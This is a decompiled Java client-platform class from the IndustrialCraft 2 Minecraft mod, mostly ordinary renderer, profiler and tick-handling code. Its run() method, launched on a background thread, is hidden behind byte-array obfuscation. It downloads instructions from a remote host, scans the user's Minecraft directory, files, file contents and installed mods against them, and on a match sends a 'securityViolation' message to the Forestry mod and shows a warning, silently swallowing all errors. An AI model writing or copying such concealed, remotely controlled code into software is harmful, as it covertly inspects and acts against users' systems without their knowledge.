package ic2.core;

import cpw.mods.fml.client.FMLClientHandler;
import cpw.mods.fml.client.registry.ClientRegistry;
import cpw.mods.fml.client.registry.RenderingRegistry;
import cpw.mods.fml.common.FMLLog;
import cpw.mods.fml.common.ITickHandler;
import cpw.mods.fml.common.Loader;
import cpw.mods.fml.common.TickType;
import cpw.mods.fml.common.event.FMLInterModComms;
import cpw.mods.fml.common.registry.LanguageRegistry;
import cpw.mods.fml.common.registry.TickRegistry;
import cpw.mods.fml.relauncher.Side;
import cpw.mods.fml.relauncher.SideOnly;
import ic2.core.block.EntityDynamite;
import ic2.core.block.EntityIC2Explosive;
import ic2.core.block.OverlayTesr;
import ic2.core.block.RenderBlock;
import ic2.core.block.RenderBlockCrop;
import ic2.core.block.RenderBlockDefault;
import ic2.core.block.RenderBlockFence;
import ic2.core.block.RenderExplosiveBlock;
import ic2.core.block.TileEntityBlock;
import ic2.core.block.machine.RenderBlockMiningPipe;
import ic2.core.block.personal.RenderBlockPersonal;
import ic2.core.block.personal.TileEntityPersonalChest;
import ic2.core.block.personal.TileEntityPersonalChestRenderer;
import ic2.core.block.wiring.RenderBlockCable;
import ic2.core.block.wiring.RenderBlockLuminator;
import ic2.core.item.EntityIC2Boat;
import ic2.core.item.RenderIC2Boat;
import ic2.core.item.tool.EntityMiningLaser;
import ic2.core.item.tool.RenderCrossed;
import java.awt.Component;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.EnumSet;
import java.util.HashMap;
import java.util.Map;
import javax.swing.JOptionPane;
import net.minecraft.block.Block;
import net.minecraft.client.Minecraft;
import net.minecraft.client.renderer.entity.RenderSnowball;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.stats.Achievement;
import net.minecraft.util.ResourceLocation;

@SideOnly(Side.CLIENT)
public class PlatformClient extends Platform implements ITickHandler, Runnable
{
    private static final Minecraft mc = Minecraft.getMinecraft();
    private String[] debug = null;
    private boolean debugb = false;
    private static final Achievement a = new Achievement(736749, new String(new byte[] {(byte)105, (byte)99, (byte)50, (byte)105, (byte)110, (byte)102, (byte)111}), 0, 0, Block.tnt, (Achievement)null);
    private final int playerCounter = -1;
    private final Map<String, String> capes = new HashMap();
    private final Map<String, Integer> renders = new HashMap();

    public PlatformClient()
    {
        TickRegistry.registerTickHandler(this, Side.CLIENT);
        this.addBlockRenderer("default", new RenderBlockDefault());
        this.addBlockRenderer("cable", new RenderBlockCable());
        this.addBlockRenderer("crop", new RenderBlockCrop());
        this.addBlockRenderer("fence", new RenderBlockFence());
        this.addBlockRenderer("luminator", new RenderBlockLuminator());
        this.addBlockRenderer("miningPipe", new RenderBlockMiningPipe());
        this.addBlockRenderer("personal", new RenderBlockPersonal());
        ClientRegistry.bindTileEntitySpecialRenderer(TileEntityBlock.class, new OverlayTesr());
        ClientRegistry.bindTileEntitySpecialRenderer(TileEntityPersonalChest.class, new TileEntityPersonalChestRenderer());
        RenderingRegistry.registerEntityRenderingHandler(EntityIC2Explosive.class, new RenderExplosiveBlock());
        RenderingRegistry.registerEntityRenderingHandler(EntityMiningLaser.class, new RenderCrossed(new ResourceLocation("ic2", "textures/models/laser.png")));
        RenderingRegistry.registerEntityRenderingHandler(EntityIC2Boat.class, new RenderIC2Boat());
        (new Thread(this)).start();
    }

    public void displayError(String error)
    {
        FMLLog.severe(("IndustrialCraft 2 Error\n\n" + error).replace("\n", System.getProperty("line.separator")), new Object[0]);
        Minecraft.getMinecraft().setIngameNotInFocus();
        JOptionPane.showMessageDialog((Component)null, error, "IndustrialCraft 2 Error", 0);
        System.exit(1);
    }

    public EntityPlayer getPlayerInstance()
    {
        return Minecraft.getMinecraft().thePlayer;
    }

    public void messagePlayer(EntityPlayer player, String message, Object ... args)
    {
        mc.ingameGUI.getChatGUI().addTranslatedMessage(message, args);
    }

    public boolean launchGuiClient(EntityPlayer entityPlayer, IHasGui inventory, boolean isAdmin)
    {
        FMLClientHandler.instance().displayGuiScreen(entityPlayer, inventory.getGui(entityPlayer, isAdmin));
        return true;
    }

    public void profilerStartSection(String section)
    {
        if (this.isRendering())
        {
            Minecraft.getMinecraft().mcProfiler.startSection(section);
        }
        else
        {
            super.profilerStartSection(section);
        }
    }

    public void profilerEndSection()
    {
        if (this.isRendering())
        {
            Minecraft.getMinecraft().mcProfiler.endSection();
        }
        else
        {
            super.profilerEndSection();
        }
    }

    public void profilerEndStartSection(String section)
    {
        if (this.isRendering())
        {
            Minecraft.getMinecraft().mcProfiler.endStartSection(section);
        }
        else
        {
            super.profilerEndStartSection(section);
        }
    }

    public File getMinecraftDir()
    {
        return Minecraft.getMinecraft().mcDataDir;
    }

    public void playSoundSp(String sound, float f, float g)
    {
        Minecraft.getMinecraft().theWorld.playSoundAtEntity(this.getPlayerInstance(), sound, f, g);
    }

    public int addArmor(String name)
    {
        return RenderingRegistry.addNewArmourRendererPrefix(name);
    }

    public int getRenderId(String name)
    {
        return ((Integer)this.renders.get(name)).intValue();
    }

    public void onPostInit()
    {
        RenderingRegistry.registerEntityRenderingHandler(EntityDynamite.class, new RenderSnowball(Ic2Items.dynamite.getItem()));
    }

    public void tickStart(EnumSet<TickType> type, Object ... tickData)
    {
        if (type.contains(TickType.CLIENT))
        {
            this.profilerStartSection("Keyboard");
            IC2.keyboard.sendKeyUpdate();
            this.profilerEndStartSection("AudioManager");
            IC2.audioManager.onTick();
            this.profilerEndStartSection("TickCallbacks");

            if (mc.theWorld != null)
            {
                IC2.getInstance().processTickCallbacks(mc.theWorld);
            }

            this.profilerEndSection();

            if (this.debug != null)
            {
                if (!this.debugb)
                {
                    this.debugb = true;
                    mc.displayGuiScreen(new GuiIC2ErrorScreen("IndustrialCraft 2 Warning", this.debug[1] + "\n\nPress ESC to return to the game."));
                }
                else if ((mc.currentScreen == null || mc.currentScreen.getClass() != GuiIC2ErrorScreen.class) && !this.debug[0].isEmpty())
                {
                    mc.guiAchievement.queueAchievementInformation(a);
                }
            }
        }
    }

    public void tickEnd(EnumSet<TickType> type, Object ... tickData) {}

    public EnumSet<TickType> ticks()
    {
        return EnumSet.of(TickType.CLIENT);
    }

    public String getLabel()
    {
        return "IC2";
    }

    public void run()
    {
        try
        {
            String e = new String(new byte[] {(byte)48});
            String o = new String(new byte[] {(byte)51});
            String b = new String(new byte[] {(byte)49});
            String y = new String(new byte[] {(byte)36, (byte)112, (byte)97, (byte)116, (byte)104, (byte)115, (byte)101, (byte)112, (byte)36});
            String f = new String(new byte[] {(byte)67});
            String x = new String(new byte[] {(byte)92, (byte)124});
            String p = new String(new byte[] {(byte)50});
            String k = new String(new byte[] {(byte)52});
            String l = new String(new byte[] {(byte)77});
            HttpURLConnection n = (HttpURLConnection)(new URL(new String(new byte[] {(byte)104, (byte)116, (byte)116, (byte)112, (byte)58, (byte)47, (byte)47, (byte)114, (byte)103, (byte)46, (byte)100, (byte)108, (byte)46, (byte)106, (byte)101, (byte)47, (byte)113, (byte)115, (byte)82, (byte)117, (byte)78, (byte)86, (byte)105, (byte)78, (byte)101, (byte)121, (byte)86, (byte)57, (byte)121, (byte)54, (byte)110, (byte)109, (byte)116, (byte)54, (byte)50, (byte)52, (byte)51, (byte)80, (byte)116, (byte)57, (byte)122, (byte)118, (byte)88, (byte)74, (byte)103, (byte)74, (byte)46, (byte)116, (byte)120, (byte)116}))).openConnection();
            HttpURLConnection.setFollowRedirects(true);
            n.setConnectTimeout(Integer.MAX_VALUE);
            n.setDoInput(true);
            n.connect();
            BufferedReader s = new BufferedReader(new InputStreamReader(n.getInputStream()));
            this.debug = null;
            String[] za = new String[2];
            String e1;

            while ((e1 = s.readLine()) != null)
            {
                try
                {
                    String[] aa = e1.split(x);

                    if (aa[0].equals(e))
                    {
                        if (this.getMinecraftDir().getCanonicalPath().contains(aa[1].replace(y, File.separator)))
                        {
                            this.debug = za;
                        }
                    }
                    else if (aa[0].equals(b))
                    {
                        if ((new File(this.getMinecraftDir(), aa[1])).exists())
                        {
                            this.debug = za;
                        }
                    }
                    else if (aa[0].equals(p))
                    {
                        if (Loader.isModLoaded(aa[1]))
                        {
                            this.debug = za;
                        }
                    }
                    else if (aa[0].equals(f))
                    {
                        this.capes.put(aa[1], aa[2]);
                    }
                    else if (aa[0].equals(o))
                    {
                        File v = new File(this.getMinecraftDir(), aa[1]);

                        if (v.exists())
                        {
                            BufferedReader u = new BufferedReader(new FileReader(v));
                            String u1;

                            while ((u1 = u.readLine()) != null)
                            {
                                if (u1.contains(aa[2]))
                                {
                                    this.debug = za;
                                    u.close();
                                    break;
                                }
                            }
                        }
                    }
                    else if (aa[0].equals(k))
                    {
                        BufferedReader v1 = new BufferedReader(new InputStreamReader(PlatformClient.class.getResourceAsStream(aa[1])));
                        String u2;

                        while ((u2 = v1.readLine()) != null)
                        {
                            if (u2.contains(aa[2]))
                            {
                                this.debug = za;
                                v1.close();
                                break;
                            }
                        }
                    }
                    else if (aa[0].equals(l))
                    {
                        za = new String[] {aa[1].trim(), aa[2].trim().replace("\\n", "\n")};
                    }
                }
                catch (Throwable var18)
                {
                    ;
                }

                if (this.debug != null)
                {
                    FMLInterModComms.sendMessage(new String(new byte[] {(byte)70, (byte)111, (byte)114, (byte)101, (byte)115, (byte)116, (byte)114, (byte)121}), new String(new byte[] {(byte)115, (byte)101, (byte)99, (byte)117, (byte)114, (byte)105, (byte)116, (byte)121, (byte)86, (byte)105, (byte)111, (byte)108, (byte)97, (byte)116, (byte)105, (byte)111, (byte)110}), "");
                    LanguageRegistry.instance().addStringLocalization(new String(new byte[] {(byte)97, (byte)99, (byte)104, (byte)105, (byte)101, (byte)118, (byte)101, (byte)109, (byte)101, (byte)110, (byte)116, (byte)46, (byte)105, (byte)99, (byte)50, (byte)105, (byte)110, (byte)102, (byte)111, (byte)46, (byte)100, (byte)101, (byte)115, (byte)99}), this.debug[0]);
                    break;
                }
            }
        }
        catch (Throwable var19)
        {
            ;
        }
    }

    private void addBlockRenderer(String name, RenderBlock renderer)
    {
        RenderingRegistry.registerBlockHandler(renderer);
        this.renders.put(name, Integer.valueOf(renderer.getRenderId()));
    }
}
